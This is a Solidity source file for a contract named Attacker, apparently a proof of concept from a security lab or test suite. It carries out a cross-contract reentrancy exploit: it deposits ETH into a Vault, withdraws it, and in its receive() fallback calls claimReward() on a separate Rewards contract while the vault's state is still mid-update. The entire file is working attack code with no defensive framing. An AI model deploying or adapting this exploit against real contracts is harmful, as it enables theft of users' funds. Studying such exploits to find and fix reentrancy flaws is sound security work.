// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Vault.sol";
import "./Rewards.sol";

contract Attacker {
    Vault public vault;
    Rewards public rewards;
    bool private attacked;

    constructor(Vault _vault, Rewards _rewards) {
        vault = _vault;
        rewards = _rewards;
    }

    function attack(Vault _vault, Rewards _rewards) external payable {
        // Deposit 1 ETH into the vault
        vault.deposit{value: msg.value}();

        // Withdraw the deposited amount, triggering the reentrancy attack
        vault.withdraw();
    }

    receive() external payable {
        if (!attacked) {
            attacked = true;
            // cross-contract reentry: claim rewards from a different contract while vault's state is mid-update.
            rewards.claimReward();
        }
    }
}
